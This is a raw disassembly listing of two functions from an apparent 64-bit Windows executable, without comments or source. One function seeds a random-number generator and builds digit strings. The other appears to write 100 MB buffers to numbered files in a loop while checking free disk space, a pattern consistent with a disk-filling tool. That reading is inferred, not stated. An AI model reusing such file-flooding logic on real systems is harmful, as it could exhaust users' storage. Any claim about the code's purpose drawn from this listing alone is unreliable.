   140002cef:	ba 18 00 00 00       	mov    $0x18,%edx
   140002cf4:	48 8b cb             	mov    %rbx,%rcx
   140002cf7:	e8 a4 3c 00 00       	call   0x1400069a0
   140002cfc:	90                   	nop
   140002cfd:	48 8d 4d a8          	lea    -0x58(%rbp),%rcx
   140002d01:	ff 15 91 55 00 00    	call   *0x5591(%rip)        # 0x140008298
   140002d07:	90                   	nop
   140002d08:	48 8d 4d 90          	lea    -0x70(%rbp),%rcx
   140002d0c:	ff 15 86 55 00 00    	call   *0x5586(%rip)        # 0x140008298
   140002d12:	90                   	nop
   140002d13:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140002d18:	ff 15 7a 55 00 00    	call   *0x557a(%rip)        # 0x140008298
   140002d1e:	85 f6                	test   %esi,%esi
   140002d20:	78 0d                	js     0x140002d2f
   140002d22:	48 8b 8d b8 00 00 00 	mov    0xb8(%rbp),%rcx
   140002d29:	48 8b 01             	mov    (%rcx),%rax
   140002d2c:	ff 50 10             	call   *0x10(%rax)
   140002d2f:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   140002d33:	48 8b 01             	mov    (%rcx),%rax
   140002d36:	ff 50 10             	call   *0x10(%rax)
   140002d39:	48 8b 4d 70          	mov    0x70(%rbp),%rcx
   140002d3d:	48 8b 01             	mov    (%rcx),%rax
   140002d40:	ff 50 10             	call   *0x10(%rax)
   140002d43:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   140002d47:	48 8b 01             	mov    (%rcx),%rax
   140002d4a:	ff 50 10             	call   *0x10(%rax)
   140002d4d:	ff 15 b5 58 00 00    	call   *0x58b5(%rip)        # 0x140008608
   140002d53:	8b c6                	mov    %esi,%eax
   140002d55:	e9 cb f9 ff ff       	jmp    0x140002725
   140002d5a:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140002d5f:	e8 7c 3a 00 00       	call   0x1400067e0
   140002d64:	90                   	nop
   140002d65:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140002d6a:	e8 71 3a 00 00       	call   0x1400067e0
   140002d6f:	90                   	nop
   140002d70:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140002d75:	e8 66 3a 00 00       	call   0x1400067e0
   140002d7a:	90                   	nop
   140002d7b:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140002d80:	e8 5b 3a 00 00       	call   0x1400067e0
   140002d85:	90                   	nop
   140002d86:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140002d8b:	e8 50 3a 00 00       	call   0x1400067e0
   140002d90:	90                   	nop
   140002d91:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140002d96:	e8 45 3a 00 00       	call   0x1400067e0
   140002d9b:	90                   	nop
   140002d9c:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140002da1:	e8 3a 3a 00 00       	call   0x1400067e0
   140002da6:	90                   	nop
   140002da7:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140002dac:	e8 2f 3a 00 00       	call   0x1400067e0
   140002db1:	cc                   	int3
   140002db2:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140002db7:	e8 24 3a 00 00       	call   0x1400067e0
   140002dbc:	cc                   	int3
   140002dbd:	cc                   	int3
   140002dbe:	cc                   	int3
   140002dbf:	cc                   	int3
   140002dc0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002dc5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140002dca:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140002dcf:	55                   	push   %rbp
   140002dd0:	41 54                	push   %r12
   140002dd2:	41 55                	push   %r13
   140002dd4:	41 56                	push   %r14
   140002dd6:	41 57                	push   %r15
   140002dd8:	48 8d ac 24 70 ec ff 	lea    -0x1390(%rsp),%rbp
   140002ddf:	ff 
   140002de0:	b8 90 14 00 00       	mov    $0x1490,%eax
   140002de5:	e8 b6 41 00 00       	call   0x140006fa0
   140002dea:	48 2b e0             	sub    %rax,%rsp
   140002ded:	48 8b 05 4c a2 00 00 	mov    0xa24c(%rip),%rax        # 0x14000d040
   140002df4:	48 33 c4             	xor    %rsp,%rax
   140002df7:	48 89 85 80 13 00 00 	mov    %rax,0x1380(%rbp)
   140002dfe:	33 f6                	xor    %esi,%esi
   140002e00:	ff 15 12 54 00 00    	call   *0x5412(%rip)        # 0x140008218
   140002e06:	c7 85 74 13 00 00 ff 	movl   $0xffffffff,0x1374(%rbp)
   140002e0d:	ff ff ff 
   140002e10:	89 45 f4             	mov    %eax,-0xc(%rbp)
   140002e13:	ba 01 00 00 00       	mov    $0x1,%edx
   140002e18:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140002e1f:	00 
   140002e20:	8b c8                	mov    %eax,%ecx
   140002e22:	c1 e9 1e             	shr    $0x1e,%ecx
   140002e25:	33 c8                	xor    %eax,%ecx
   140002e27:	69 c1 65 89 07 6c    	imul   $0x6c078965,%ecx,%eax
   140002e2d:	03 c2                	add    %edx,%eax
   140002e2f:	89 44 95 f4          	mov    %eax,-0xc(%rbp,%rdx,4)
   140002e33:	48 ff c2             	inc    %rdx
   140002e36:	48 81 fa 70 02 00 00 	cmp    $0x270,%rdx
   140002e3d:	72 e1                	jb     0x140002e20
   140002e3f:	c7 45 f0 70 02 00 00 	movl   $0x270,-0x10(%rbp)
   140002e46:	48 8d 1d ff 5d 00 00 	lea    0x5dff(%rip),%rbx        # 0x140008c4c
   140002e4d:	4c 8d 35 ec 5d 00 00 	lea    0x5dec(%rip),%r14        # 0x140008c40
   140002e54:	48 8d 3d f5 5d 00 00 	lea    0x5df5(%rip),%rdi        # 0x140008c50
   140002e5b:	49 bc ff a1 2f 4d ff 	movabs $0x7fffffff4d2fa1ff,%r12
   140002e62:	ff ff 7f 
   140002e65:	41 bd 00 5e d0 b2    	mov    $0xb2d05e00,%r13d
   140002e6b:	49 bf ff ff ff ff ff 	movabs $0x7fffffffffffffff,%r15
   140002e72:	ff ff 7f 
   140002e75:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140002e79:	e8 72 37 00 00       	call   0x1400065f0
   140002e7e:	8b c8                	mov    %eax,%ecx
   140002e80:	48 69 c9 90 5f 01 00 	imul   $0x15f90,%rcx,%rcx
   140002e87:	81 f9 ef 2d 01 00    	cmp    $0x12def,%ecx
   140002e8d:	77 1b                	ja     0x140002eaa
   140002e8f:	90                   	nop
   140002e90:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140002e94:	e8 57 37 00 00       	call   0x1400065f0
   140002e99:	8b c8                	mov    %eax,%ecx
   140002e9b:	48 69 c9 90 5f 01 00 	imul   $0x15f90,%rcx,%rcx
   140002ea2:	81 f9 f0 2d 01 00    	cmp    $0x12df0,%ecx
   140002ea8:	72 e6                	jb     0x140002e90
   140002eaa:	48 c1 e9 20          	shr    $0x20,%rcx
   140002eae:	81 e9 f0 d8 ff 7f    	sub    $0x7fffd8f0,%ecx
   140002eb4:	0f ba f9 1f          	btc    $0x1f,%ecx
   140002eb8:	4c 8d 4d e2          	lea    -0x1e(%rbp),%r9
   140002ebc:	0f 1f 40 00          	nopl   0x0(%rax)
   140002ec0:	49 83 e9 02          	sub    $0x2,%r9
   140002ec4:	b8 cd cc cc cc       	mov    $0xcccccccd,%eax
   140002ec9:	f7 e1                	mul    %ecx
   140002ecb:	c1 ea 03             	shr    $0x3,%edx
   140002ece:	0f b7 c2             	movzwl %dx,%eax
   140002ed1:	66 c1 e0 02          	shl    $0x2,%ax
   140002ed5:	44 8d 04 10          	lea    (%rax,%rdx,1),%r8d
   140002ed9:	66 45 03 c0          	add    %r8w,%r8w
   140002edd:	66 41 2b c8          	sub    %r8w,%cx
   140002ee1:	66 83 c1 30          	add    $0x30,%cx
   140002ee5:	66 41 89 09          	mov    %cx,(%r9)
   140002ee9:	8b ca                	mov    %edx,%ecx
   140002eeb:	85 d2                	test   %edx,%edx
   140002eed:	75 d1                	jne    0x140002ec0
   140002eef:	4c 8d 45 e2          	lea    -0x1e(%rbp),%r8
   140002ef3:	49 8b d1             	mov    %r9,%rdx
   140002ef6:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002efb:	e8 f0 2a 00 00       	call   0x1400059f0
   140002f00:	90                   	nop
   140002f01:	4c 8b 44 24 40       	mov    0x40(%rsp),%r8
   140002f06:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140002f0b:	48 8b c1             	mov    %rcx,%rax
   140002f0e:	49 2b c0             	sub    %r8,%rax
   140002f11:	48 83 f8 06          	cmp    $0x6,%rax
   140002f15:	0f 82 93 00 00 00    	jb     0x140002fae
   140002f1b:	49 8d 40 06          	lea    0x6(%r8),%rax
   140002f1f:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140002f24:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
   140002f29:	48 83 f9 07          	cmp    $0x7,%rcx
   140002f2d:	48 0f 47 7c 24 30    	cmova  0x30(%rsp),%rdi
   140002f33:	48 3b df             	cmp    %rdi,%rbx
   140002f36:	76 1e                	jbe    0x140002f56
   140002f38:	4a 8d 04 47          	lea    (%rdi,%r8,2),%rax
   140002f3c:	4c 3b f0             	cmp    %rax,%r14
   140002f3f:	77 15                	ja     0x140002f56
   140002f41:	49 3b fe             	cmp    %r14,%rdi
   140002f44:	77 05                	ja     0x140002f4b
   140002f46:	48 8b de             	mov    %rsi,%rbx
   140002f49:	eb 10                	jmp    0x140002f5b
   140002f4b:	48 8b df             	mov    %rdi,%rbx
   140002f4e:	49 2b de             	sub    %r14,%rbx
   140002f51:	48 d1 fb             	sar    $1,%rbx
   140002f54:	eb 05                	jmp    0x140002f5b
   140002f56:	bb 06 00 00 00       	mov    $0x6,%ebx
   140002f5b:	4e 8d 04 45 02 00 00 	lea    0x2(,%r8,2),%r8
   140002f62:	00 
   140002f63:	48 8d 4f 0c          	lea    0xc(%rdi),%rcx
   140002f67:	48 8b d7             	mov    %rdi,%rdx
   140002f6a:	e8 a2 4a 00 00       	call   0x140007a11
   140002f6f:	48 03 db             	add    %rbx,%rbx
   140002f72:	4c 8b c3             	mov    %rbx,%r8
   140002f75:	49 8b d6             	mov    %r14,%rdx
   140002f78:	48 8b cf             	mov    %rdi,%rcx
   140002f7b:	e8 8b 4a 00 00       	call   0x140007a0b
   140002f80:	41 b8 0c 00 00 00    	mov    $0xc,%r8d
   140002f86:	4c 2b c3             	sub    %rbx,%r8
   140002f89:	49 8d 56 0c          	lea    0xc(%r14),%rdx
   140002f8d:	48 03 d3             	add    %rbx,%rdx
   140002f90:	48 8d 0c 1f          	lea    (%rdi,%rbx,1),%rcx
   140002f94:	e8 72 4a 00 00       	call   0x140007a0b
   140002f99:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140002f9e:	48 8d 1d a7 5c 00 00 	lea    0x5ca7(%rip),%rbx        # 0x140008c4c
   140002fa5:	48 8d 3d a4 5c 00 00 	lea    0x5ca4(%rip),%rdi        # 0x140008c50
   140002fac:	eb 18                	jmp    0x140002fc6
   140002fae:	48 c7 44 24 28 06 00 	movq   $0x6,0x28(%rsp)
   140002fb5:	00 00 
   140002fb7:	ba 06 00 00 00       	mov    $0x6,%edx
   140002fbc:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002fc1:	e8 6a 34 00 00       	call   0x140006430
   140002fc6:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002fc9:	0f 11 45 98          	movups %xmm0,-0x68(%rbp)
   140002fcd:	0f 57 c9             	xorps  %xmm1,%xmm1
   140002fd0:	f3 0f 7f 4d a8       	movdqu %xmm1,-0x58(%rbp)
   140002fd5:	0f 10 00             	movups (%rax),%xmm0
   140002fd8:	0f 11 45 98          	movups %xmm0,-0x68(%rbp)
   140002fdc:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140002fe0:	0f 11 4d a8          	movups %xmm1,-0x58(%rbp)
   140002fe4:	48 89 70 10          	mov    %rsi,0x10(%rax)
   140002fe8:	48 c7 40 18 07 00 00 	movq   $0x7,0x18(%rax)
   140002fef:	00 
   140002ff0:	66 89 30             	mov    %si,(%rax)
   140002ff3:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   140002ff8:	48 83 fa 07          	cmp    $0x7,%rdx
   140002ffc:	76 37                	jbe    0x140003035
   140002ffe:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140003005:	00 
   140003006:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   14000300b:	48 8b c1             	mov    %rcx,%rax
   14000300e:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140003015:	72 19                	jb     0x140003030
   140003017:	48 83 c2 27          	add    $0x27,%rdx
   14000301b:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   14000301f:	48 2b c1             	sub    %rcx,%rax
   140003022:	48 83 e8 08          	sub    $0x8,%rax
   140003026:	48 83 f8 1f          	cmp    $0x1f,%rax
   14000302a:	0f 87 42 01 00 00    	ja     0x140003172
   140003030:	e8 6b 39 00 00       	call   0x1400069a0
   140003035:	89 74 24 70          	mov    %esi,0x70(%rsp)
   140003039:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000303c:	f3 0f 7f 44 24 78    	movdqu %xmm0,0x78(%rsp)
   140003042:	48 89 75 8c          	mov    %rsi,-0x74(%rbp)
   140003046:	89 75 94             	mov    %esi,-0x6c(%rbp)
   140003049:	48 8d 45 98          	lea    -0x68(%rbp),%rax
   14000304d:	48 83 7d b0 07       	cmpq   $0x7,-0x50(%rbp)
   140003052:	48 0f 47 45 98       	cmova  -0x68(%rbp),%rax
   140003057:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   14000305c:	48 89 7c 24 68       	mov    %rdi,0x68(%rsp)
   140003061:	c7 44 24 74 01 00 00 	movl   $0x1,0x74(%rsp)
   140003068:	00 
   140003069:	c7 45 88 01 00 01 00 	movl   $0x10001,-0x78(%rbp)
   140003070:	45 33 c9             	xor    %r9d,%r9d
   140003073:	4c 8d 44 24 60       	lea    0x60(%rsp),%r8
   140003078:	ba 01 00 00 00       	mov    $0x1,%edx
   14000307d:	33 c9                	xor    %ecx,%ecx
   14000307f:	ff 15 f3 51 00 00    	call   *0x51f3(%rip)        # 0x140008278
   140003085:	85 c0                	test   %eax,%eax
   140003087:	75 76                	jne    0x1400030ff
   140003089:	48 8d 45 98          	lea    -0x68(%rbp),%rax
   14000308d:	48 83 7d b0 07       	cmpq   $0x7,-0x50(%rbp)
   140003092:	48 0f 47 45 98       	cmova  -0x68(%rbp),%rax
   140003097:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   14000309c:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%rsp)
   1400030a3:	00 
   1400030a4:	4c 8d 4c 24 58       	lea    0x58(%rsp),%r9
   1400030a9:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   1400030af:	48 8d 15 ba 5b 00 00 	lea    0x5bba(%rip),%rdx        # 0x140008c70
   1400030b6:	33 c9                	xor    %ecx,%ecx
   1400030b8:	ff 15 ca 51 00 00    	call   *0x51ca(%rip)        # 0x140008288
   1400030be:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400030c1:	33 c0                	xor    %eax,%eax
   1400030c3:	0f 11 45 b8          	movups %xmm0,-0x48(%rbp)
   1400030c7:	0f 11 45 c8          	movups %xmm0,-0x38(%rbp)
   1400030cb:	0f 11 45 d8          	movups %xmm0,-0x28(%rbp)
   1400030cf:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   1400030d3:	c7 45 e0 01 00 01 00 	movl   $0x10001,-0x20(%rbp)
   1400030da:	48 8d 55 98          	lea    -0x68(%rbp),%rdx
   1400030de:	48 83 7d b0 07       	cmpq   $0x7,-0x50(%rbp)
   1400030e3:	48 0f 47 55 98       	cmova  -0x68(%rbp),%rdx
   1400030e8:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1400030ed:	4c 8d 4d b8          	lea    -0x48(%rbp),%r9
   1400030f1:	33 c9                	xor    %ecx,%ecx
   1400030f3:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400030f9:	ff 15 81 51 00 00    	call   *0x5181(%rip)        # 0x140008280
   1400030ff:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140003104:	e8 17 df ff ff       	call   0x140001020
   140003109:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   14000310e:	49 3b c4             	cmp    %r12,%rax
   140003111:	7d 0b                	jge    0x14000311e
   140003113:	4a 8d 0c 28          	lea    (%rax,%r13,1),%rcx
   140003117:	48 89 4c 24 58       	mov    %rcx,0x58(%rsp)
   14000311c:	eb 05                	jmp    0x140003123
   14000311e:	4c 89 7c 24 58       	mov    %r15,0x58(%rsp)
   140003123:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140003128:	e8 23 2a 00 00       	call   0x140005b50
   14000312d:	48 8b 55 b0          	mov    -0x50(%rbp),%rdx
   140003131:	48 83 fa 07          	cmp    $0x7,%rdx
   140003135:	0f 86 3a fd ff ff    	jbe    0x140002e75
   14000313b:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140003142:	00 
   140003143:	48 8b 4d 98          	mov    -0x68(%rbp),%rcx
   140003147:	48 8b c1             	mov    %rcx,%rax
   14000314a:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140003151:	72 15                	jb     0x140003168
   140003153:	48 83 c2 27          	add    $0x27,%rdx
   140003157:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   14000315b:	48 2b c1             	sub    %rcx,%rax
   14000315e:	48 83 e8 08          	sub    $0x8,%rax
   140003162:	48 83 f8 1f          	cmp    $0x1f,%rax
   140003166:	77 20                	ja     0x140003188
   140003168:	e8 33 38 00 00       	call   0x1400069a0
   14000316d:	e9 03 fd ff ff       	jmp    0x140002e75
   140003172:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140003177:	45 33 c9             	xor    %r9d,%r9d
   14000317a:	45 33 c0             	xor    %r8d,%r8d
   14000317d:	33 d2                	xor    %edx,%edx
   14000317f:	33 c9                	xor    %ecx,%ecx
   140003181:	ff 15 39 53 00 00    	call   *0x5339(%rip)        # 0x1400084c0
   140003187:	cc                   	int3
   140003188:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000318d:	45 33 c9             	xor    %r9d,%r9d
   140003190:	45 33 c0             	xor    %r8d,%r8d
   140003193:	33 d2                	xor    %edx,%edx
   140003195:	33 c9                	xor    %ecx,%ecx
   140003197:	ff 15 23 53 00 00    	call   *0x5323(%rip)        # 0x1400084c0
   14000319d:	cc                   	int3
   14000319e:	cc                   	int3
   14000319f:	cc                   	int3
   1400031a0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400031a5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400031aa:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   1400031af:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   1400031b4:	55                   	push   %rbp
   1400031b5:	41 56                	push   %r14
   1400031b7:	41 57                	push   %r15
   1400031b9:	48 8d ac 24 70 fe ff 	lea    -0x190(%rsp),%rbp
   1400031c0:	ff 
   1400031c1:	48 81 ec 90 02 00 00 	sub    $0x290,%rsp
   1400031c8:	48 8b 05 71 9e 00 00 	mov    0x9e71(%rip),%rax        # 0x14000d040
   1400031cf:	48 33 c4             	xor    %rsp,%rax
   1400031d2:	48 89 85 80 01 00 00 	mov    %rax,0x180(%rbp)
   1400031d9:	33 c0                	xor    %eax,%eax
   1400031db:	0f 57 c9             	xorps  %xmm1,%xmm1
   1400031de:	f3 0f 7f 4c 24 30    	movdqu %xmm1,0x30(%rsp)
   1400031e4:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400031e9:	b9 27 00 40 06       	mov    $0x6400027,%ecx
   1400031ee:	e8 b5 37 00 00       	call   0x1400069a8
   1400031f3:	48 85 c0             	test   %rax,%rax
   1400031f6:	0f 84 f2 03 00 00    	je     0x1400035ee
   1400031fc:	48 8d 58 27          	lea    0x27(%rax),%rbx
   140003200:	48 83 e3 e0          	and    $0xffffffffffffffe0,%rbx
   140003204:	48 89 43 f8          	mov    %rax,-0x8(%rbx)
   140003208:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   14000320d:	48 8d b3 00 00 40 06 	lea    0x6400000(%rbx),%rsi
   140003214:	48 89 74 24 40       	mov    %rsi,0x40(%rsp)
   140003219:	33 d2                	xor    %edx,%edx
   14000321b:	41 b8 00 00 40 06    	mov    $0x6400000,%r8d
   140003221:	48 8b cb             	mov    %rbx,%rcx
   140003224:	e8 b9 46 00 00       	call   0x1400078e2
   140003229:	48 89 74 24 38       	mov    %rsi,0x38(%rsp)
   14000322e:	45 33 c9             	xor    %r9d,%r9d
   140003231:	4c 8d 05 48 5a 00 00 	lea    0x5a48(%rip),%r8        # 0x140008c80
   140003238:	48 8d 15 51 5a 00 00 	lea    0x5a51(%rip),%rdx        # 0x140008c90
   14000323f:	48 8d 4d 70          	lea    0x70(%rbp),%rcx
   140003243:	e8 38 15 00 00       	call   0x140004780
   140003248:	bf 01 00 00 00       	mov    $0x1,%edi
   14000324d:	33 d2                	xor    %edx,%edx
   14000324f:	41 b8 08 01 00 00    	mov    $0x108,%r8d
   140003255:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000325a:	e8 83 46 00 00       	call   0x1400078e2
   14000325f:	48 8d 55 70          	lea    0x70(%rbp),%rdx
   140003263:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140003268:	e8 43 18 00 00       	call   0x140004ab0
   14000326d:	90                   	nop
   14000326e:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140003273:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140003277:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   14000327c:	48 03 c8             	add    %rax,%rcx
   14000327f:	ff 15 fb 4e 00 00    	call   *0x4efb(%rip)        # 0x140008180
   140003285:	4c 8d 3d 6c 5e 00 00 	lea    0x5e6c(%rip),%r15        # 0x1400090f8
   14000328c:	4c 8d 35 e5 5d 00 00 	lea    0x5de5(%rip),%r14        # 0x140009078
   140003293:	84 c0                	test   %al,%al
   140003295:	0f 85 7d 01 00 00    	jne    0x140003418
   14000329b:	49 bc cd cc cc cc cc 	movabs $0xcccccccccccccccd,%r12
   1400032a2:	cc cc cc 
   1400032a5:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   1400032ac:	00 00 00 00 
   1400032b0:	41 b8 00 00 40 06    	mov    $0x6400000,%r8d
   1400032b6:	48 8b d3             	mov    %rbx,%rdx
   1400032b9:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400032be:	ff 15 c4 4e 00 00    	call   *0x4ec4(%rip)        # 0x140008188
   1400032c4:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   1400032c9:	e8 92 2c 00 00       	call   0x140005f60
   1400032ce:	48 85 c0             	test   %rax,%rax
   1400032d1:	75 1f                	jne    0x1400032f2
   1400032d3:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   1400032d8:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400032dc:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   1400032e1:	48 03 c8             	add    %rax,%rcx
   1400032e4:	45 33 c0             	xor    %r8d,%r8d
   1400032e7:	ba 02 00 00 00       	mov    $0x2,%edx
   1400032ec:	ff 15 6e 4f 00 00    	call   *0x4f6e(%rip)        # 0x140008260
   1400032f2:	49 8b c4             	mov    %r12,%rax
   1400032f5:	48 f7 e7             	mul    %rdi
   1400032f8:	48 c1 ea 03          	shr    $0x3,%rdx
   1400032fc:	48 8d 0c 92          	lea    (%rdx,%rdx,4),%rcx
   140003300:	48 03 c9             	add    %rcx,%rcx
   140003303:	48 3b f9             	cmp    %rcx,%rdi
   140003306:	75 2d                	jne    0x140003335
   140003308:	45 33 c9             	xor    %r9d,%r9d
   14000330b:	45 33 c0             	xor    %r8d,%r8d
   14000330e:	48 8d 55 60          	lea    0x60(%rbp),%rdx
   140003312:	48 8d 0d 83 59 00 00 	lea    0x5983(%rip),%rcx        # 0x140008c9c
   140003319:	ff 15 59 4d 00 00    	call   *0x4d59(%rip)        # 0x140008078
   14000331f:	85 c0                	test   %eax,%eax
   140003321:	0f 84 51 02 00 00    	je     0x140003578
   140003327:	48 81 7d 60 00 00 40 	cmpq   $0x6400000,0x60(%rbp)
   14000332e:	06 
   14000332f:	0f 82 cd 01 00 00    	jb     0x140003502
   140003335:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   14000333a:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000333e:	4c 89 7c 0c 50       	mov    %r15,0x50(%rsp,%rcx,1)
   140003343:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140003348:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000334c:	8d 91 58 ff ff ff    	lea    -0xa8(%rcx),%edx
   140003352:	89 54 0c 4c          	mov    %edx,0x4c(%rsp,%rcx,1)
   140003356:	4c 89 74 24 58       	mov    %r14,0x58(%rsp)
   14000335b:	48 83 7d d8 00       	cmpq   $0x0,-0x28(%rbp)
   140003360:	74 28                	je     0x14000338a
   140003362:	48 8d 4d c8          	lea    -0x38(%rbp),%rcx
   140003366:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   14000336b:	48 39 08             	cmp    %rcx,(%rax)
   14000336e:	75 1a                	jne    0x14000338a
   140003370:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
   140003374:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   140003378:	48 89 08             	mov    %rcx,(%rax)
   14000337b:	48 8b 45 90          	mov    -0x70(%rbp),%rax
   14000337f:	48 89 08             	mov    %rcx,(%rax)
   140003382:	2b d1                	sub    %ecx,%edx
   140003384:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
   140003388:	89 10                	mov    %edx,(%rax)
   14000338a:	80 7d d4 00          	cmpb   $0x0,-0x2c(%rbp)
   14000338e:	74 0a                	je     0x14000339a
   140003390:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140003395:	e8 c6 2b 00 00       	call   0x140005f60
   14000339a:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   14000339f:	ff 15 0b 4e 00 00    	call   *0x4e0b(%rip)        # 0x1400081b0
   1400033a5:	90                   	nop
   1400033a6:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1400033ab:	ff 15 df 4d 00 00    	call   *0x4ddf(%rip)        # 0x140008190
   1400033b1:	48 8d 4d f8          	lea    -0x8(%rbp),%rcx
   1400033b5:	ff 15 fd 4d 00 00    	call   *0x4dfd(%rip)        # 0x1400081b8
   1400033bb:	4c 8b cf             	mov    %rdi,%r9
   1400033be:	4c 8d 05 bb 58 00 00 	lea    0x58bb(%rip),%r8        # 0x140008c80
   1400033c5:	48 8d 15 c4 58 00 00 	lea    0x58c4(%rip),%rdx        # 0x140008c90
   1400033cc:	48 8d 4d 70          	lea    0x70(%rbp),%rcx
   1400033d0:	e8 ab 13 00 00       	call   0x140004780
   1400033d5:	48 ff c7             	inc    %rdi
   1400033d8:	33 d2                	xor    %edx,%edx
   1400033da:	41 b8 08 01 00 00    	mov    $0x108,%r8d
   1400033e0:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400033e5:	e8 f8 44 00 00       	call   0x1400078e2
   1400033ea:	48 8d 55 70          	lea    0x70(%rbp),%rdx
   1400033ee:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400033f3:	e8 b8 16 00 00       	call   0x140004ab0
   1400033f8:	90                   	nop
   1400033f9:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   1400033fe:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140003402:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   140003407:	48 03 c8             	add    %rax,%rcx
   14000340a:	ff 15 70 4d 00 00    	call   *0x4d70(%rip)        # 0x140008180
   140003410:	84 c0                	test   %al,%al
   140003412:	0f 84 98 fe ff ff    	je     0x1400032b0
   140003418:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   14000341d:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140003421:	4c 89 7c 0c 50       	mov    %r15,0x50(%rsp,%rcx,1)
   140003426:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   14000342b:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000342f:	8d 91 58 ff ff ff    	lea    -0xa8(%rcx),%edx
   140003435:	89 54 0c 4c          	mov    %edx,0x4c(%rsp,%rcx,1)
   140003439:	4c 89 74 24 58       	mov    %r14,0x58(%rsp)
   14000343e:	48 83 7d d8 00       	cmpq   $0x0,-0x28(%rbp)
   140003443:	74 28                	je     0x14000346d
   140003445:	48 8d 4d c8          	lea    -0x38(%rbp),%rcx
   140003449:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   14000344e:	48 39 08             	cmp    %rcx,(%rax)
   140003451:	75 1a                	jne    0x14000346d
   140003453:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
   140003457:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   14000345b:	48 89 08             	mov    %rcx,(%rax)
   14000345e:	48 8b 45 90          	mov    -0x70(%rbp),%rax
   140003462:	48 89 08             	mov    %rcx,(%rax)
   140003465:	2b d1                	sub    %ecx,%edx
   140003467:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
   14000346b:	89 10                	mov    %edx,(%rax)
